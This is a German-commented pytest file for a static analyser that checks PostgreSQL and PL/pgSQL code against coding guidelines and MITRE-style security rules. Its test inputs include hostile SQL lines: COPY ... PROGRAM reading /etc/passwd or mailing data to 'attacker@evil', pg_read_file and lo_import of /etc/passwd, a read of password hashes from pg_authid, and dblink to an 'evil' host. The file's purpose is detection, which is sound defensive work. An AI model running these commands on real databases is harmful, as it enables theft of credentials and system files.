"""Tests fuer die erweiterte PostgreSQL-Abdeckung in ACI 2.1.

Geprueft werden die neuen PL/pgSQL-Coding-Guidelines sowie die
zusaetzlichen PostgreSQL-Sicherheitsregeln (gefaehrliche Datei-,
Netzwerk- und Admin-Funktionen).
"""

from aci.source import Source
from aci.checks import build_guideline_checks, build_mitre_checks, PackagesCheck
from aci.rules import (load_guideline_rules, find_guidelines_dir,
                       load_mitre_rules, find_mitre_dir)


def pg_guideline_findings(code, guidelines_base):
    rules = load_guideline_rules(
        find_guidelines_dir("postgresql", guidelines_base), "postgresql")
    checks = build_guideline_checks(rules, "postgresql")
    source = Source(code, "t.sql", "postgresql")
    out = []
    for check in checks:
        out.extend(check.run(source))
    return out


def ids(findings):
    return sorted(set(f.check_id for f in findings))


# -- PL/pgSQL Coding Guidelines ------------------------------------------

def test_pg_guidelines_load(guidelines_base):
    rules = load_guideline_rules(
        find_guidelines_dir("postgresql", guidelines_base), "postgresql")
    assert rules
    assert any(r.get("enabled") for r in rules)


def test_pg_select_star_is_flagged(guidelines_base):
    f = pg_guideline_findings("SELECT * FROM employees;\n", guidelines_base)
    assert "PG-1010" in ids(f)


def test_pg_equals_null_is_flagged(guidelines_base):
    f = pg_guideline_findings(
        "SELECT a FROM t WHERE col = NULL;\n", guidelines_base)
    assert "PG-1020" in ids(f)


def test_pg_not_equals_null_is_flagged(guidelines_base):
    f = pg_guideline_findings(
        "SELECT a FROM t WHERE col <> NULL;\n", guidelines_base)
    assert "PG-1021" in ids(f)


def test_pg_not_in_subquery_is_flagged(guidelines_base):
    f = pg_guideline_findings(
        "SELECT a FROM t WHERE id NOT IN (SELECT id FROM u);\n",
        guidelines_base)
    assert "PG-3020" in ids(f)


def test_pg_count_star_existence_is_flagged(guidelines_base):
    f = pg_guideline_findings(
        "SELECT 1 FROM t HAVING count(*) > 0;\n", guidelines_base)
    assert "PG-3010" in ids(f)


def test_pg_empty_when_others_is_flagged(guidelines_base):
    code = ("CREATE FUNCTION f() RETURNS void AS $b$\n"
            "BEGIN\n  NULL;\nEXCEPTION WHEN OTHERS THEN NULL;\nEND;\n"
            "$b$ LANGUAGE plpgsql;\n")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-5010" in ids(f)


# -- Namenskonventionen (PG-NC-*) ---------------------------------------

_NC_FUNC = ("CREATE FUNCTION f() RETURNS void AS $b$\n"
            "DECLARE\n  {decl}\nBEGIN\n  NULL;\nEND;\n"
            "$b$ LANGUAGE plpgsql;\n")


def test_pg_camelcase_identifier_is_flagged(guidelines_base):
    code = _NC_FUNC.format(decl="myUserId integer;")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-NC-1010" in ids(f)


def test_pg_snake_case_identifier_is_not_flagged(guidelines_base):
    code = _NC_FUNC.format(decl="l_user_id integer;")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-NC-1010" not in ids(f)


def test_pg_short_identifier_is_flagged(guidelines_base):
    code = _NC_FUNC.format(decl="x integer;")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-NC-1020" in ids(f)


def test_pg_adequate_length_identifier_is_not_flagged(guidelines_base):
    code = _NC_FUNC.format(decl="total integer;")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-NC-1020" not in ids(f)


# -- Aus Oracle portierte Guidelines -------------------------------------

def test_pg_same_expression_both_sides_is_flagged(guidelines_base):
    f = pg_guideline_findings("SELECT 1 FROM t WHERE x = x;\n", guidelines_base)
    assert "PG-1080" in ids(f)


def test_pg_different_operands_not_flagged(guidelines_base):
    f = pg_guideline_findings("SELECT 1 FROM t WHERE x = y;\n", guidelines_base)
    assert "PG-1080" not in ids(f)


def test_pg_insert_without_column_list_is_flagged(guidelines_base):
    f = pg_guideline_findings("INSERT INTO t VALUES (1, 2);\n", guidelines_base)
    assert "PG-3110" in ids(f)


def test_pg_insert_with_column_list_not_flagged(guidelines_base):
    f = pg_guideline_findings(
        "INSERT INTO t (a, b) VALUES (1, 2);\n", guidelines_base)
    assert "PG-3110" not in ids(f)


def test_pg_natural_join_is_flagged(guidelines_base):
    f = pg_guideline_findings(
        "SELECT * FROM a NATURAL JOIN b;\n", guidelines_base)
    assert "PG-3190" in ids(f)


def test_pg_explicit_join_not_flagged(guidelines_base):
    f = pg_guideline_findings(
        "SELECT a.x FROM a JOIN b ON a.id = b.id;\n", guidelines_base)
    assert "PG-3190" not in ids(f)


def test_pg_boolean_literal_comparison_is_flagged(guidelines_base):
    code = _NC_FUNC.format(decl="ok boolean;").replace(
        "  NULL;", "  IF ok = TRUE THEN NULL; END IF;")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-4270" in ids(f)


def test_pg_boolean_assignment_not_flagged(guidelines_base):
    # ':=' (Zuweisung) darf NICHT als Vergleich gewertet werden.
    code = _NC_FUNC.format(decl="ok boolean := TRUE;")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-4270" not in ids(f)


def test_pg_create_without_or_replace_is_flagged(guidelines_base):
    f = pg_guideline_findings(
        "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$;\n",
        guidelines_base)
    assert "PG-7125" in ids(f)


def test_pg_create_or_replace_not_flagged(guidelines_base):
    f = pg_guideline_findings(
        "CREATE OR REPLACE FUNCTION f() RETURNS int LANGUAGE sql "
        "AS $$ SELECT 1 $$;\n", guidelines_base)
    assert "PG-7125" not in ids(f)


def test_pg_documented_rules_are_disabled_by_default(guidelines_base):
    # PG-2210/PG-2310/PG-2330 sind dokumentiert, aber standardmaessig aus.
    f = pg_guideline_findings(
        "CREATE TABLE t (a numeric, b char(10));\n", guidelines_base)
    got = ids(f)
    assert "PG-2210" not in got and "PG-2310" not in got


def test_pg_security_definer_without_search_path_is_flagged(guidelines_base):
    code = ("CREATE FUNCTION f() RETURNS void\n"
            "  SECURITY DEFINER\n"
            "  LANGUAGE plpgsql AS $b$\nBEGIN\n  NULL;\nEND;\n$b$;\n")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-7010" in ids(f)


def test_pg_security_definer_with_search_path_is_ok(guidelines_base):
    code = ("CREATE FUNCTION f() RETURNS void\n"
            "  SECURITY DEFINER\n"
            "  SET search_path = pg_catalog, public\n"
            "  LANGUAGE plpgsql AS $b$\nBEGIN\n  NULL;\nEND;\n$b$;\n")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-7010" not in ids(f)


def test_pg_security_definer_search_path_is_routine_scoped(guidelines_base):
    # L1-Regression: zwei Funktionen in EINER Datei. Die zweite hat ein
    # eigenes SET search_path; das darf die erste (ungesicherte) NICHT
    # fälschlich sicher erscheinen lassen. PG-7010 muss genau einmal,
    # in der ersten Funktion, melden.
    code = (
        "CREATE FUNCTION unsafe_fn() RETURNS int\n"
        "  LANGUAGE plpgsql SECURITY DEFINER AS $$\n"
        "BEGIN RETURN 1; END;\n$$;\n"
        "CREATE FUNCTION safe_fn() RETURNS int\n"
        "  LANGUAGE plpgsql SECURITY DEFINER SET search_path = app, pg_temp AS $$\n"
        "BEGIN RETURN 1; END;\n$$;\n")
    f = pg_guideline_findings(code, guidelines_base)
    hits = [x for x in f if x.check_id == "PG-7010"]
    assert len(hits) == 1
    # Die Fundstelle liegt in der ersten (ungesicherten) Funktion.
    assert hits[0].line <= 3


def test_pg_security_definer_both_unsafe_each_flagged(guidelines_base):
    # Zwei ungesicherte SECURITY-DEFINER-Funktionen -> zwei Findings.
    code = (
        "CREATE FUNCTION a() RETURNS int LANGUAGE plpgsql SECURITY DEFINER AS $$\n"
        "BEGIN RETURN 1; END; $$;\n"
        "CREATE FUNCTION b() RETURNS int LANGUAGE plpgsql SECURITY DEFINER AS $$\n"
        "BEGIN RETURN 2; END; $$;\n")
    hits = [x for x in pg_guideline_findings(code, guidelines_base)
            if x.check_id == "PG-7010"]
    assert len(hits) == 2


def test_pg_clean_code_has_no_guideline_findings(guidelines_base):
    # Idiomatisch sauber: CREATE OR REPLACE (siehe PG-7125), snake_case-
    # Parameter, keine der beanstandeten Muster.
    code = ("CREATE OR REPLACE FUNCTION f(in_id integer) RETURNS integer\n"
            "  LANGUAGE plpgsql AS $b$\n"
            "BEGIN\n  RETURN in_id;\nEND;\n$b$;\n")
    assert pg_guideline_findings(code, guidelines_base) == []


# -- Erweiterte PostgreSQL-Sicherheitsregeln -----------------------------

def pkg(code, pg_rules):
    source = Source(code, "t.sql", "postgresql")
    return PackagesCheck(pg_rules.check("undesired_packages"),
                         "postgresql").run(source)


def test_pg_file_write_is_flagged(pg_rules):
    f = pkg("SELECT pg_file_write('/tmp/x', 'data', false);\n", pg_rules)
    assert any(x.rule_ref == "pg_file_write" for x in f)


def test_dblink_connect_u_is_flagged(pg_rules):
    f = pkg("SELECT dblink_connect_u('conn', 'host=evil');\n", pg_rules)
    assert any(x.rule_ref == "dblink_connect_u" for x in f)


def test_pg_authid_access_is_flagged(pg_rules):
    f = pkg("SELECT rolpassword FROM pg_authid;\n", pg_rules)
    assert any(x.rule_ref == "pg_authid" for x in f)


def test_set_config_is_flagged(pg_rules):
    f = pkg("SELECT set_config('search_path', 'evil', false);\n", pg_rules)
    assert any(x.rule_ref == "set_config" for x in f)


# -- EPAS-Konsistenz: zusätzliche Oracle-kompatible Pakete ---------------

def test_dbms_lob_is_flagged(pg_rules):
    # EPAS stellt DBMS_LOB bereit; analog zur Oracle-Liste flaggen.
    f = pkg("SELECT dbms_lob.loadclobfromfile(x, y);\n", pg_rules)
    assert any(x.rule_ref == "dbms_lob" for x in f)


def test_utl_mail_is_flagged(pg_rules):
    f = pkg("SELECT utl_mail.send('a@x', 'b@y', NULL, NULL, 's', 'm');\n",
            pg_rules)
    assert any(x.rule_ref == "utl_mail" for x in f)


def test_utl_url_is_flagged(pg_rules):
    f = pkg("SELECT utl_url.escape('http://evil/');\n", pg_rules)
    assert any(x.rule_ref == "utl_url" for x in f)


def test_utl_encode_is_flagged(pg_rules):
    f = pkg("SELECT utl_encode.base64_encode(raw_data);\n", pg_rules)
    assert any(x.rule_ref == "utl_encode" for x in f)


def test_utl_tcp_no_longer_listed(pg_rules):
    # EPAS implementiert kein UTL_TCP -> der Eintrag wurde entfernt und
    # darf kein Finding mehr erzeugen.
    f = pkg("SELECT utl_tcp.open_connection('host', 25);\n", pg_rules)
    assert not any(x.rule_ref == "utl_tcp" for x in f)


def test_plr_untrusted_language_is_flagged(pg_rules):
    f = pkg("CREATE FUNCTION f() RETURNS void LANGUAGE plr AS 'body';\n",
            pg_rules)
    assert any(x.rule_ref == "plr" for x in f)


# -- PostgreSQL-MITRE: COPY ... PROGRAM ----------------------------------

def pg_mitre(code, mitre_base):
    rules = load_mitre_rules(
        find_mitre_dir("postgresql", mitre_base), "postgresql")
    checks = build_mitre_checks(rules, "postgresql")
    source = Source(code, "t.sql", "postgresql")
    out = []
    for check in checks:
        out.extend(check.run(source))
    return out


def test_copy_from_program_is_flagged(mitre_base):
    f = pg_mitre("COPY t FROM PROGRAM 'cat /etc/passwd';\n", mitre_base)
    assert any("COPY" in x.message for x in f)


def test_copy_to_program_is_flagged(mitre_base):
    f = pg_mitre("COPY t TO PROGRAM 'mail attacker@evil';\n", mitre_base)
    assert any("COPY" in x.message for x in f)


def test_plain_copy_from_stdin_is_not_server_file_finding(mitre_base):
    f = pg_mitre("COPY t FROM STDIN;\n", mitre_base)
    assert not any(x.check_id == "ACI-PG-COPY-SERVER-FILE-FROM" for x in f)


def test_copy_program_in_comment_is_not_flagged(mitre_base):
    f = pg_mitre("-- COPY t FROM PROGRAM 'id';\nSELECT 1;\n", mitre_base)
    assert f == []


def test_copy_program_in_string_is_not_flagged(mitre_base):
    f = pg_mitre("SELECT 'COPY t FROM PROGRAM id';\n", mitre_base)
    assert f == []


# -- PostgreSQL-MITRE: hartcodiertes Passwort (T1552) --------------------

def test_pg_hardcoded_password_in_create_role_is_flagged(mitre_base):
    f = pg_mitre("CREATE ROLE app LOGIN PASSWORD 'secret123';\n", mitre_base)
    assert any(x.check_id == "T1552" for x in f)


def test_pg_hardcoded_password_in_alter_role_is_flagged(mitre_base):
    f = pg_mitre("ALTER ROLE app PASSWORD 'newpass';\n", mitre_base)
    assert any(x.check_id == "T1552" for x in f)


def test_pg_role_without_password_literal_is_not_flagged(mitre_base):
    # Rolle ohne Passwort-Literal -> kein Hardcoded-Password-Finding.
    f = pg_mitre("CREATE ROLE app LOGIN;\n", mitre_base)
    assert not any(x.check_id == "T1552" for x in f)


def test_pg_password_in_comment_is_not_flagged(mitre_base):
    f = pg_mitre("-- CREATE ROLE app PASSWORD 'x';\nSELECT 1;\n", mitre_base)
    assert not any(x.check_id == "T1552" for x in f)


# -- PostgreSQL-MITRE: GRANT ... TO PUBLIC (T1098) -----------------------

def test_pg_grant_to_public_is_flagged(mitre_base):
    f = pg_mitre("GRANT SELECT ON orders TO PUBLIC;\n", mitre_base)
    assert any(x.check_id == "T1098" for x in f)


def test_pg_grant_to_named_role_is_not_public(mitre_base):
    f = pg_mitre("GRANT SELECT ON orders TO app_role;\n", mitre_base)
    assert not any(x.check_id == "T1098" for x in f)


def test_pg_alter_system_is_flagged(mitre_base):
    f = pg_mitre("ALTER SYSTEM SET shared_preload_libraries = 'x';\n", mitre_base)
    assert any(x.check_id == "T1059-ALTER-SYSTEM" for x in f)


def test_pg_create_extension_dblink_is_flagged(mitre_base):
    f = pg_mitre("CREATE EXTENSION dblink;\n", mitre_base)
    assert any(x.check_id == "T1059-CREATE-EXTENSION-RISKY" for x in f)


def test_pg_create_extension_in_comment_is_not_flagged(mitre_base):
    f = pg_mitre("-- CREATE EXTENSION dblink;\nSELECT 1;\n", mitre_base)
    assert not any(x.check_id == "T1059-CREATE-EXTENSION-RISKY" for x in f)


def test_pg_server_file_functions_are_flagged(mitre_base):
    f = pg_mitre("SELECT pg_read_file('/etc/passwd');\n", mitre_base)
    assert any(x.check_id == "T1005-PG-SERVER-FILE-FUNCTIONS" for x in f)


def test_pg_large_object_file_io_is_flagged(mitre_base):
    f = pg_mitre("SELECT lo_import('/etc/passwd');\n", mitre_base)
    assert any(x.check_id == "T1005-PG-LO-FILE-IO" for x in f)


def test_pg_alter_default_privileges_to_public_is_flagged(mitre_base):
    f = pg_mitre("ALTER DEFAULT PRIVILEGES GRANT SELECT ON TABLES TO PUBLIC;\n", mitre_base)
    assert any(x.check_id == "T1098-DEFAULT-PUBLIC" for x in f)


def test_pg_grant_public_in_string_is_not_flagged(mitre_base):
    f = pg_mitre("SELECT 'GRANT SELECT ON t TO PUBLIC';\n", mitre_base)
    assert not any(x.check_id == "T1098" for x in f)


def test_pg_security_definer_with_public_search_path_is_flagged(guidelines_base):
    code = ("CREATE FUNCTION f() RETURNS void\n"
            "  SECURITY DEFINER\n"
            "  SET search_path = app, public, pg_temp\n"
            "  LANGUAGE plpgsql AS $b$\nBEGIN\n  NULL;\nEND;\n$b$;\n")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-7011" in ids(f)


def test_pg_security_definer_dynamic_execute_is_flagged(guidelines_base):
    code = ("CREATE FUNCTION f(p_table text) RETURNS void\n"
            "  SECURITY DEFINER\n"
            "  SET search_path = app, pg_temp\n"
            "  LANGUAGE plpgsql AS $b$\nBEGIN\n  EXECUTE 'select * from ' || p_table;\nEND;\n$b$;\n")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-7012" in ids(f)


def test_pg_security_definer_unqualified_call_is_flagged(guidelines_base):
    code = ("CREATE FUNCTION f() RETURNS void\n"
            "  SECURITY DEFINER\n"
            "  SET search_path = app, pg_temp\n"
            "  LANGUAGE plpgsql AS $b$\nBEGIN\n  PERFORM dangerous();\nEND;\n$b$;\n")
    f = pg_guideline_findings(code, guidelines_base)
    assert "PG-7013" in ids(f)
